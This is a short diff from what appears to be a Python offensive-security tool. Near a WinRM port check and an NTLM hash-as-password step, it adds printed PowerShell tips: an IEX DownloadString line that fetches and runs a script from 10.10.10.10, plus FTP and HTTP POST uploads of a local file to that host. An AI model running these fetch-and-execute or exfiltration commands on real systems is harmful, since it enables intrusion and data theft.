@@ -3711,6 +3711,13 @@ while True:
       if checkParam != 1:
          checkParam = test_PRT("5985")            
       if checkParam != 1:
+         print("[i] The following commands may be useful for file uploads...\n")
+         localCOM("echo '" + Green + "'")
+         print("    IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/exploit.sh')")
+         print("    -Command \"(New-Object Net.WebClient).UploadFile('ftp://10.10.10.10/exploit.sh','C:\\local\\exploit.sh')\"")
+         print("    -Command \"Copy-Item 'C:\\local\\exploit.sh' -Destination '\\\\remotehost\\share\\'\"")
+         print("    -Command \"Invoke-WebRequest -Uri 'https://10.10.10.10/exploit.sh' -Method Post -InFile 'C:\\local\\exploit.sh' -ContentType 'application/octext-stream'\"")
+         localCOM("echo '" + Reset + "'")
          if NTM[:5] != "EMPTY":
             print("[i] Using the HASH value as a password credential...")
             if IP46 == "-4":
